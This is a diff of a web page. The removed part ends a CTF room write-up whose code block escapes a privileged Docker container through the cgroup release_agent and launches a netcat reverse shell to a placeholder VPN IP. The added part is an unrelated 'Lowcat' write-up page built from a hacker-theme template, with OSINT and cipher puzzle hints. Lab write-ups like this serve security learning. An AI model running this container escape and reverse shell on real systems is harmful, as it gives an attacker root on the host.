-<p>Searching how to escape docker containers I stumbled upon <a href="https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1">this post</a>, we can see that we are indeed in a privileged container, so following the instructions in it we can execute any command we want, so let’s try to get a reverse shell in the host machine.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x
-echo 1 &gt; /tmp/cgrp/x/notify_on_release
-host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
-echo "$host_path/cmd" &gt; /tmp/cgrp/release_agent
-echo '#!/bin/sh' &gt; /cmd
-echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc [YOUR_VPN_IP] 5555 &gt;/tmp/f" &gt;&gt; /cmd
-chmod a+x /cmd
-sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"
-</code></pre></div></div>
-
-<p>Now we are root in the outside, lets go to /root and cat the info.txt file:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You were looking at the tree and it was clearly magical, but you could see that the farther you went from the root, the weaker the magical energy.
-So the energy was clearly coming from the bottom, so you saw that the soil was soft, different from the rest of the cave, so you dug down.
-After digging for some time, you realized that the root stopped getting thinner, in fact it was getting thicker and thicker.
-Suddently the gravity started changing and you grabbed the nearest thing you could get a hold of, now what was up was down.
-And when you looked up you saw the same tree, but now you can see the sun, you're finally in the outside.
-
-Flag:[REDACTED]
-</code></pre></div></div>
-
-<p>Hope you liked it, i had a lot of fun making this room :D</p>
-
-
-      </section>
-
-    </div>
-
-    
-  </body>
+<html>
+   <head>
+      <link rel="icon" href="https://avatars.githubusercontent.com/u/69230350?v=4">
+      <title>Lowcat - Official WriteUp</title>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <link rel="stylesheet" href="assets/css/main.css">
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato">
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+      <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+      <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js?autoload=true&amp;skin=sunburst&amp;lang=css" defer=""></script>
+      <!-- Version 1.0.1-->
+   </head>
+   <body>
+      <h2></h2>
+      <!-- heading 1 -->
+      <h1 class="bold topp left" > $ ./Lowcat - Official WriteUp</h1>
+      <h2></h2>
+      <!-- gray text --->
+      <l class="gray left" >Hacker Themed HTML Template.</l>
+      <br>
+      <br>
+      <!-- buttons -->
+      <!-- <a href="https://github.com/thelearn-tech/hacker-theme/archive/refs/heads/main.zip" class="button leftmar ">Download as .zip</a> <a href="https://github.com/thelearn-tech/hacker-theme" class="button ">View on Github</a> <a href="pages/hacker-theme-login.html" class="button ">Login</a> -->
+      <!-- horizontal rule-->
+      <hr class="hr">
+      <!-- paragraph -->
+      <br>
+      <!-- <p>
+         Text can be <h class="bold">Bold</h>, <h class="ital">italic</h>, <h class="oblique">oblique</h>, <h class="underline">underline</h>, <h class="overline">overline</h>, <h class="strickthrough">strikethrough</h>or <h class='keyword'>keyword</h>.
+      </p> -->
+      <!-- paragraph -->
+      <!-- <p>
+         This is page is recreation of <h class="bold">jekyll-hacker-theme </h>in HTML , CSS & JS
+      </p> -->
+      
+      <!-- link -->
+      <!-- <p><a href="https://github.com/pages-themes/hacker" title="jekyll-hacker-theme" target="_self" class="linkk bold">Link to Jekyll Hacker Theme.</a></p>
+      
+      <p>Next paragraph.</p> -->
+      <!-- link inside a text line -->
+      <!-- <p>Find details about this page on <a href="https://github.com/thelearn-tech/hacker-theme" title="hacker-theme" target="_self" class="linkk bold"> Github</a>. Original project also can be found on Github.</p>
+       -->
+
+      <h2 class="left">TASK 1 : ¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿</h2>
+      <!-- blockquotes | make sure to add a "cite" link/' cite="#" ' or it won't work -->
+      
+ 
+      <br>
+      <blockquote>which is in area 51 : google-it ! 
+      </blockquote>
+      <blockquote>who owns the alien's website ? : alien.com
+      </blockquote>
+      <blockquote>"oce nas" ? : google-it !
+      </blockquote>
+      <blockquote>Where does the flag of this printscreen come from : qwefbn - look at this website : https://prnt.sc
+      </blockquote>
+      
+      <h3 class="left">TASK 2 : ????????????????????????????????????????????</h3>
+      <blockquote>Username : user5436536495544 / go on tiktok !
+      </blockquote>
+      <blockquote>Pearl Harbor it's a trap : look a the bio and go at pastebin.com
+      </blockquote>
+      <blockquote>When the plane crash Pentagone ? [format = 00:00] : look at the exif !
+      </blockquote>
+      <blockquote>Where did the incident happen? [place]. : look at the exif !
+      </blockquote>
+      <blockquote>What is the name of the author of the photo?: look at the exif !
+      </blockquote>
+
+
+                  <!-- <pre class="prettyprint">
+                   // Javascript with syntax highlighting
+                   // thelearn-tech@github
+                     
+                  const files = [ 'foo.txt ', '.bar', '   ', 'baz.foo' ];
+                  let filePaths = [];
+                  for (let file of files) {
+                    const fileName = file.trim();
+                    if(fileName) {
+                      const filePath = `~/cool_app/${fileName}`;
+                      filePaths.push(filePath);
+                    }
+                  }
+      // filePaths = [ '~/cool_app/foo.txt', '~/cool_app/.bar', '~/cool_app/baz.foo']</pre>
+      <br>
+      
+                  <pre class="prettyprint">
+                  # Python code with syntax highlighting
+                  # thelearn-tech@github
+                  from os import path
+                  def check_for_file():
+                      print("Does file exist:", path.exists("data.csv"))
+                  if __name__=="__main__":
+                      check_for_file()
+      </pre> -->
+      
+      <h4 class="left" >TASK 3 : ANGEL OR DEVIL ?</h4>
+      
+      <ul>
+         <!-- Unordered list -->
+         <li>  ??? 𐤓𐤏𐤃 𐤏𐤓 𐤁𐤋𐤏𐤏
+          go to : https://www.lexilogos.com/keyboard/phoenician.htm</li>
+         <li>𓁨    1000000  ???????
+            <img src="https://cdn.discordapp.com/attachments/871491287486967860/965726226994057297/unknown.png"> <img src="https://cdn.discordapp.com/attachments/871491287486967860/965725314787475477/unknown.png" >
+                 </li>
+         <li>⠞⠓⠍{⠇⠕⠺⠉⠁_⠉⠕⠇⠕⠝⠑⠇_⠼⠙⠑⠗⠼⠋⠎⠭}
+<img src="https://cdn.discordapp.com/attachments/871491287486967860/965726489800757308/unknown.png"> <img src="https://cdn.discordapp.com/attachments/871491287486967860/965726696168914974/unknown.png">
+         </li>
+         <li>/q/images-3_43.jpg <img src="https://cdn.discordapp.com/attachments/871491287486967860/965727010053840916/unknown.png"> and the answer is the name of the object
+            <li>0bin/?2b3dde36b79999ed#REWjhZvau8V7Gm5SM6jen+i4GMK1KGvRSOW924cG4D8= - The password is the last question <img sizes="500px" src="https://cdn.discordapp.com/attachments/871491287486967860/965729350802604062/unknown.png"> and then <img src="https://cdn.discordapp.com/attachments/871491287486967860/965727558224199720/unknown.png">
+
+
+
+            </li>
+
+<li>And Moab rebels against Israel after the........  - google it ! </li>
+<li>8;20;20;16;19;:;/;/;16;1;19;20;5;2;9;14;.;3;15;13;/;3;21;7;6;24;10;3;2 - <img src="https://cdn.discordapp.com/attachments/871491287486967860/965728735254966402/unknown.png"> <img src="https://cdn.discordapp.com/attachments/871491287486967860/965728944328441896/unknown.png"> All that remains is to add the /
+   'EDITED'</li>
+
+         </li>
+      </ul>
+      
+      <!-- <h5 class="left" >Heading 5</h5> -->
+      
+      <!-- <ol>
+         <li>This is an ordered list, following a heading.</li>
+         <li>This is an ordered list, following a heading.</li>
+         <li>This is an ordered list, following a heading.</li>
+      </ol> -->
+      
+      <!-- <h6 class="left">Heading 6</h6>
+      
+      <table class="left">
+         <tr>
+            <th>Name</th>
+            <th class="left">Age</th>
+            <th class="left">Gender</th>
+         </tr>
+         <tr>
+            <td>Josh</td>
+            <td class="left">27</td>
+            <td class="left">Male</td>
+         </tr>
+         <tr>
+            <td>Tom</td>
+            <td class="left">25</td>
+            <td class="left">Male</td>
+         </tr>
+         <tr>
+            <td>Olivia</td>
+            <td class="left">Never Ask</td>
+            <td class="left">Female</td>
+         </tr>
+         <tr>
+            <td>This</td>
+            <td class="left">is a</td>
+            <td class="left">Table</td>
+         </tr>
+      </table>
+      <h4 class="left">Look there is a horizontal rule below this. -->
+      <!-- horizontal rule -->
+      <!-- <hr class="hr">
+      <br>
+      <h5 class="left">Unordered list:</h5>
+      <ul> -->
+         <!-- Unordered list -->
+         <!-- <li>Milk</li>
+         <li>Tea</li>
+         <li>Coffee</li>
+      </ul>
+      <br>
+      <h5 class="left">Ordered list:</h5>
+      <ol> -->
+         <!-- Unordered list -->
+         <!-- <li class="mediumsize">item I</li>
+         <li class="mediumsize">item II</li>
+         <li class="mediumsize">item III</li>
+      </ol>
+      <br>
+      <h5 class="left">Nested list:</h5>
+      <ul> -->
+         <!-- Unordered list -->
+         <!-- <li>Category 1</li>
+         <ul>
+            <li>Level 1</li>
+            <li>Level 2</li>
+         </ul>
+         <li>Category 2</li>
+         <ul>
+            <li>Level 1</li>
+            <li>Level 2</li>
+         </ul>
+         <li>Category 3</li>
+         <ul>
+            <li>Level 1</li>
+            <li>Level 2</li>
+         </ul>
+      </ul>
+      <br> -->
+      <!-- small images -->
+      <!-- <h5 class="left">Small image</h5>
+      <l class="gray left" >click on image to view source.</l>
+      
+      <h2></h2> -->
+      <!-- img -->
+      <!-- <a href="https://github.com/logos"><img src="https://i.ibb.co/DM5nzg9/Octocat.png" alt="github png" class="smallimg"></a>  <a href="https://www.freepnglogos.com/pics/linux"><img src="https://i.ibb.co/JQKxhJw/the-linux-kernel.png" alt="linux compiling kernel png" class="smallimg"> </a> -->
+      <!-- <br>
+      <h2></h2> -->
+      <!-- large image -->
+      <!-- <h5 class="left">Large image</h5>
+      <h2></h2>
+      <img src="https://i.ibb.co/M16Bj41/Friday-info.jpg" alt="friday info" class="largeimg left">
+      <h2></h2> -->
+      <!-- img --->
+      <!-- <h5 class="left">Description list:</h5>
+      <h2></h2> -->
+      
+      <!-- description list -->
+      
+      <!-- <dl class="left">
+         <dt>Creator</dt>
+         <dd>thelearn-tech</dd>
+         <dt>Hosted on</dt>
+         <dd>Github</dd>
+         <dt>Language</dt>
+         <dd>HTML CSS JS</dd>
+      </dl> -->
+      <!-- long commands -->
+      <!-- <div class="horizontalscroll left">
+         <l>For long commands or code scroll should be horizontal rather than vertical. Very longgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg text. </l>
+      </div>
+      <br>
+      <div class="horizontalscroll left">
+         <l>Enjoy the theme</l>
+      </div>
+      <br> -->
+      <!-- footer -->
+      <!-- <footer class="w3-center w3-black w3-padding-64 w3-opacity w3-hover-opacity-off">
+         <button onclick="topFunction()" class="w3-button w3-light-grey" title="Go to top"><i class="fa fa-arrow-up w3-margin-right w3-light-grey"></i>To Top</button>
+         <div class="w3-xlarge w3-section"> -->
+            
+            <!-- small logo with redirecting link -->
+            <!-- <a href="https://twitter.com/thelearn_tech/" <i class="fa fa-twitter w3-hover-opacity"></a>
+            <a href="https://instagram.com/thelearn_tech/" <i class="fa fa-instagram w3-hover-opacity"></a>
+            <a href="https://github.com/thelearn-tech/" <i class="fa fa-github w3-hover-opacity"></a>
+            
+         </div> -->
+         <!-- page link -->
+         <!-- <p>
+            <a href="pages/hacker-theme-page2.html" title="" target="_self" class="w3-hover-text-green">Next</a>
+            <h> & </h> <a href="pages/hacker-theme-page2.html" title="" target="_self" class="w3-hover-text-green">2</a>
+            <h>, </h>
+            <a href="pages/hacker-theme-page3.html" title="" target="_self" class="w3-hover-text-green">3</a>
+         </p>
+         <h class="w3-center"><em>Requested from </em></h>
+         <h id="usrip">  </h>
+         
+      </footer>
+      
+      <script> // js for scroll to TOP
+      function topFunction() {
+      
+      document.body.scrollTop = 0; // For Safari
+      
+      document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera
+      
+      }
+       -->
+      
+      </script>
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"> </script>
+      <script src="assets/js/ip.js"> </script>
+      
+   </div>
+</body>
 </html>
